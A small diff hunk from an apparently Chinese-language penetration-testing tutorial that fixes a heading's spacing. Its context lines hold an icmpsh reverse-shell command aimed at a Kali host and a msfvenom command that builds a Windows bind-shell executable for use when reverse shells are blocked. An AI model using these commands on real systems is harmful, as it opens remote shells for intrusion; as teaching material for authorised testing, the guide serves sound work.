@@ -201,7 +201,7 @@ icmpsh.exe -t kali_ip -d 500 -b 30 -s 128
 可以看到icmp进行通信的  
 ![](./pic/3_proxy/10.jpg)
 
-#####Shell反弹不出的时候
+##### Shell反弹不出的时候
 主要针对：本机kali不是外网或者目标在dmz里面反弹不出shell，可以通过这种直连shell然后再通过http的端口转发到本地的metasploit  
 ```
 1、msfvenom -p windows/x64/shell/bind_tcp LPORT=12345 -f exe -o ./shell.exe
